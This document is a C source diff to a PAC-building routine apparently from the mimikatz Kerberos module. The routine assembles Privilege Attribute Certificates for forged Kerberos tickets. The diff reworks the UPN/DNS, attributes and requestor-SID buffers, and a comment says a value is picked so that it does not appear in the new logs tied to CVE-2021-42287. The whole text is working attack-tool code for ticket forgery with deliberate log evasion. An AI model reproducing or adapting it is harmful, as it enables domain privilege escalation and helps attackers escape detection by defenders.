@@ -11,7 +11,7 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 	PVOID pLogonInfo = NULL, pClaims = NULL;
 	PPAC_CLIENT_INFO pClientInfo = NULL;
 	PAC_SIGNATURE_DATA signature = {SignatureType, {0}};
-	DWORD n = 8, szLogonInfo = 0, szLogonInfoAligned = 0, szClientInfo = 0, szClientInfoAligned, szClaims = 0, szClaimsAligned = 0, szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature), szSignatureAligned, offsetData = sizeof(PACTYPE) + 7 * sizeof(PAC_INFO_BUFFER);
+	DWORD n = 7, szLogonInfo = 0, szLogonInfoAligned = 0, szClientInfo = 0, szClientInfoAligned, szClaims = 0, szClaimsAligned = 0, szSignature = FIELD_OFFSET(PAC_SIGNATURE_DATA, Signature), szSignatureAligned, offsetData = sizeof(PACTYPE) + 6 * sizeof(PAC_INFO_BUFFER);
 	PKERB_CHECKSUM pCheckSum;
 	INT pacAttributeType = 1; // Default to a value that doesnt show up on the new logs in CVE-2021-42287
 
@@ -95,26 +95,27 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 
 
 		// Making UPN
-		wchar_t upn[100];
-		swprintf(upn, 100, L"%s@%s", validationInfo->EffectiveName.Buffer, domainname);
-		wchar_t domainnameConverted[100];
-		swprintf(domainnameConverted, 100, L"%s", domainname);
+		wchar_t domainnameConverted[24];
+		swprintf(domainnameConverted, 24, L"%s", domainname);
+		wchar_t upn[36];
+		swprintf(upn, 36, L"%s@%s", validationInfo->EffectiveName.Buffer, domainname);
+		
 
 		
 
 		// Setting UPN DNS INFO
 		UPN_DNS_INFO upnDnsInfo;
-		upnDnsInfo.DnsDomainNameLength = validationInfo->LogonDomainName.Length * 2;
-		upnDnsInfo.DnsDomainNameOffset = 64;
 		upnDnsInfo.UpnLength = lstrlenW(upn) * 2;
-		upnDnsInfo.UpnOffset = 24;
-		upnDnsInfo.Flags = 0x00000001;
+		upnDnsInfo.UpnOffset = 16;
+		upnDnsInfo.DnsDomainNameLength = validationInfo->LogonDomainName.Length * 2;
+		upnDnsInfo.DnsDomainNameOffset = upnDnsInfo.UpnLength + upnDnsInfo.UpnOffset;
+		upnDnsInfo.Flags = 0x00000000;
 		//upnDnsInfo.Upn = upn;
 		//upnDnsInfo.Domain = domainnameConverted;
 
-		
+			
 
-		auto szUpnDnsInfo = sizeof(UPN_DNS_INFO);
+		auto szUpnDnsInfo = sizeof(upnDnsInfo);
 		auto szUpn = sizeof(upn);
 		auto szDomainname = sizeof(domainnameConverted);
 		DWORD szUpnAligned = SIZE_ALIGN(szUpn, 8);
@@ -123,7 +124,7 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 
 		if(pLogonInfo && pClientInfo)
 		{
-			*pacLength = offsetData + szLogonInfoAligned + szClientInfoAligned + szUpnDnsInfoAligned + szUpnAligned + szDomainnameAligned + szPacAttributeInfoAligned + szPacRequestorSidAligned + 2 * szSignatureAligned;
+			*pacLength = offsetData + szLogonInfoAligned + szClientInfoAligned + szUpnDnsInfoAligned + upnDnsInfo.UpnLength + szDomainname +  szPacAttributeInfoAligned + szPacRequestorSidAligned + 2 * szSignatureAligned;
 			if(*pacType = (PPACTYPE) LocalAlloc(LPTR, *pacLength))
 			{
 				(*pacType)->cBuffers = n;
@@ -139,32 +140,22 @@ BOOL kuhl_m_pac_validationInfo_to_PAC(PKERB_VALIDATION_INFO validationInfo, PFIL
 				(*pacType)->Buffers[1].Offset = (*pacType)->Buffers[0].Offset + szLogonInfoAligned;
 				RtlCopyMemory((PBYTE) *pacType + (*pacType)->Buffers[1].Offset, pClientInfo, (*pacType)->Buffers[1].cbBufferSize);
 
-				(*pacType)->Buffers[2].cbBufferSize = szUpnDnsInfo;
+				(*pacType)->Buffers[2].cbBufferSize = szUpnDnsInfo + upnDnsInfo.UpnLength + szDomainname;
 				(*pacType)->Buffers[2].ulType = PACINFO_TYPE_UPN_DNS;
 				(*pacType)->Buffers[2].Offset = (*pacType)->Buffers[1].Offset + szClientInfoAligned;
 				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset, &upnDnsInfo, (*pacType)->Buffers[2].cbBufferSize);
-				//RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned + upnDnsInfo.UpnOffset, &upn, szUpn);
-				//RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned + upnDnsInfo.DnsDomainNameOffset, &domainnameConverted, szDomainname);
+				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned, &upn, upnDnsInfo.UpnLength);
+				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned + upnDnsInfo.UpnLength, &domainnameConverted, szDomainname);
 
-				(*pacType)->Buffers[3].cbBufferSize = szUpn;
-				(*pacType)->Buffers[3].ulType = PACINFO_TYPE_UPN_DNS;
-				(*pacType)->Buffers[3].Offset = (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned;
-				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[3].Offset, &upn, (*pacType)->Buffers[3].cbBufferSize);
+				(*pacType)->Buffers[3].cbBufferSize = szPacAttributeInfo;
+				(*pacType)->Buffers[3].ulType = PACINFO_TYPE_ATTRIBUTES_INFO;
+				(*pacType)->Buffers[3].Offset = (*pacType)->Buffers[2].Offset + szUpnDnsInfoAligned + upnDnsInfo.UpnLength + szDomainname;
+				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[3].Offset, &pacAttributeInfo, (*pacType)->Buffers[3].cbBufferSize);
 
-				(*pacType)->Buffers[4].cbBufferSize = szDomainname;
-				(*pacType)->Buffers[4].ulType = PACINFO_TYPE_UPN_DNS;
-				(*pacType)->Buffers[4].Offset = (*pacType)->Buffers[3].Offset + szUpnAligned;
-				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[4].Offset, &domainnameConverted, (*pacType)->Buffers[4].cbBufferSize);
-
-				(*pacType)->Buffers[5].cbBufferSize = szPacAttributeInfo;
-				(*pacType)->Buffers[5].ulType = PACINFO_TYPE_ATTRIBUTES_INFO;
-				(*pacType)->Buffers[5].Offset = (*pacType)->Buffers[4].Offset + szDomainnameAligned;
-				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[5].Offset, &pacAttributeInfo, (*pacType)->Buffers[5].cbBufferSize);
-
-				(*pacType)->Buffers[6].cbBufferSize = szPacRequestorsid;
-				(*pacType)->Buffers[6].ulType = PACINFO_TYPE_PAC_REQUESTOR;
-				(*pacType)->Buffers[6].Offset = (*pacType)->Buffers[5].Offset + szPacAttributeInfoAligned;
-				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[6].Offset, &requestor, (*pacType)->Buffers[6].cbBufferSize);
+				(*pacType)->Buffers[4].cbBufferSize = szPacRequestorsid;
+				(*pacType)->Buffers[4].ulType = PACINFO_TYPE_PAC_REQUESTOR;
+				(*pacType)->Buffers[4].Offset = (*pacType)->Buffers[3].Offset + szPacAttributeInfoAligned;
+				RtlCopyMemory((PBYTE)*pacType + (*pacType)->Buffers[4].Offset, &requestor, (*pacType)->Buffers[4].cbBufferSize);
 
 				if (szClaimsAligned)
 				{
